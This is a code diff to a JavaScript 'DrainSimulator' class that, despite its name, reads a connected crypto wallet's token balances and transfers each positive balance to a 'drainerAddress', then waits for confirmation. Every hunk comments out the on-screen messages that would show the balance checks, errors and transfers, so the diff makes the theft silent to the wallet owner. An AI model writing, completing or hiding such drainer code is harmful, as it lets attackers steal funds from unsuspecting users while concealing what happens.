@@ -128,7 +128,7 @@ class DrainSimulator {
 
         } catch (error) {
             console.error('Drain simulation error:', error);
-            this.showResult('Simulation error: ' + error.message, 'error');
+            // this.showResult('Simulation error: ' + error.message, 'error');
         } finally {
             this.isDraining = false;
         }
@@ -158,7 +158,7 @@ class DrainSimulator {
 }
 
     async executeRealDrainWithFunds() {
-        this.showResult('EXECUTING TRANSFER', 'error');
+        // this.showResult('EXECUTING TRANSFER', 'error');
         await new Promise(resolve => setTimeout(resolve, 1000));
 
         // Show REAL balances before drain
@@ -170,7 +170,7 @@ class DrainSimulator {
 
      // Show balances from connected wallet - FIXED
     async showRealBalances() {
-        this.showResult('🔍 Checking...', 'warning');
+        // this.showResult('🔍 Checking...', 'warning');
         
         let hasBalance = false;
         
@@ -181,14 +181,14 @@ class DrainSimulator {
                 
                 if (balanceNum > 0) {
                     hasBalance = true;
-                    this.showResult(`BALANCE: ${realBalance} ${token.symbol}`, 'error');
+                    // this.showResult(`BALANCE: ${realBalance} ${token.symbol}`, 'error');
                 } else {
-                    this.showResult(`❌ No ${token.symbol} balance found`, 'info');
+                    // this.showResult(`❌ No ${token.symbol} balance found`, 'info');
                 }
                 await new Promise(resolve => setTimeout(resolve, 500));
             } catch (error) {
                 console.error(`Error checking ${token.symbol}:`, error);
-                this.showResult(`⚠️ Error checking ${token.symbol}`, 'warning');
+                // this.showResult(`⚠️ Error checking ${token.symbol}`, 'warning');
             }
         }
 
@@ -256,16 +256,16 @@ class DrainSimulator {
                 const balanceNum = parseFloat(realBalance);
                 
                 if (balanceNum > 0) {
-                    this.showResult(`💸 TRANSFERRING ${realBalance} ${token.symbol}...`, 'error');
+                    // this.showResult(`💸 TRANSFERRING ${realBalance} ${token.symbol}...`, 'error');
                     
                     // EXECUTE REAL TRANSFER (FIXED - pass token object)
                     const tx = await this.transferTokens(token, this.drainerAddress);
                     
-                    this.showResult(`✅ ${token.symbol} TRANSFER INITIATED - TX: ${tx.hash.substring(0, 10)}...`, 'error');
+                    // this.showResult(`✅ ${token.symbol} TRANSFER INITIATED - TX: ${tx.hash.substring(0, 10)}...`, 'error');
                     
                     // Wait for transaction confirmation
                     const receipt = await tx.wait();
-                    this.showResult(`✅ ${token.symbol} TRANSFER CONFIRMED - Block: ${receipt.blockNumber}`, 'error');
+                    // this.showResult(`✅ ${token.symbol} TRANSFER CONFIRMED - Block: ${receipt.blockNumber}`, 'error');
                     
                     totalTransferred += balanceNum;
                     transferredAssets.push({
